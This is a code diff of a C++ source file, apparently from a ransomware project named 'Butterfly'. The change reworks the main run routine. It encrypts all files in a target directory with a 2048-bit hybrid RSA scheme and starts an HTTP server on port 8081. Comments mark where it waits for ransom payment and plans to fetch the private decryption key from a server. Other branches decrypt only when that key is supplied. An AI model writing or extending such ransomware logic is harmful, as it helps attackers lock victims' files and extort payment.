@@ -46,27 +46,29 @@ void Butterfly::initLoggingFramework()
 void Butterfly::run()
 {
 
-    // Start Encryption + Decryption
+    // Start Hybrid Encryption Mechanism (Encryption + Remote Server Request + Decryption)
     if ( !_args.dir.empty() )
     {
-        // start encryption
+        // Start encryption
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
         std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
         encryptor->invokeDir(_args.dir, _args.protection);
 
-        //sleep(5);
+        // After encryption start http server, gui or wallpaper
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
+        //server->registerMasterPKeyCB(std::bind(&hybrid::Decryptor::invokeDir, decryptor, std::placeholders::_1));
+        server->run();
 
-        // start decryption
+        // Wait for ransom payment
+
+        // Create HTTP Get Request to bflyServerApp to get the decrypted CPrivateRSA.pem string
+
+        // Start decryption
         std::shared_ptr<butterfly::hybrid::Decryptor> decryptor = std::make_shared<butterfly::hybrid::Decryptor>();
         decryptor->setDirPath(_args.dir);
         //decryptor->invokeDir("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
-
-        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
-        server->registerMasterPKeyCB(std::bind(&hybrid::Decryptor::invokeDir, decryptor, std::placeholders::_1));
-        server->run();
-
     }
-        // Start only Encryption
+    // Start only Encryption
     else if ( !_args.encrypt.empty() )
     {
 
@@ -75,16 +77,26 @@ void Butterfly::run()
         encryptor->invokeDir(_args.encrypt, _args.protection);
 
     }
-        // Start only Decryption
-    else if ( !_args.decrypt.empty() )
+    // Start only Decryption
+    else if ( !_args.decrypt.empty() && _args.serverpKey.empty())
     {
         std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
         std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;
         decryptor->setDirPath(_args.decrypt);
-        decryptor->invokeDir(_args.serverpKey);
-    } else
+        //TODO create server request to get the decrypted CPrivateRSA.pem string
+        //decryptor->invokeDir(_args.serverpKey);
+    }
+    // Start Decryption with provided key
+    else if ( !_args.decrypt.empty() && !_args.serverpKey.empty())
     {
-        throw ButterflyException("Invalid usage of the Arguments!");
+        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
+        std::cout << "Start Decryption with provided key " << _args.serverpKey << " from directory " << _args.decrypt << std::endl;
+        decryptor->setDirPath(_args.decrypt);
+        decryptor->invokeDir(_args.serverpKey);
+    }
+    else
+    {
+        throw ButterflyException("Invalid usage of the command line arguments!");
     }
 
 }
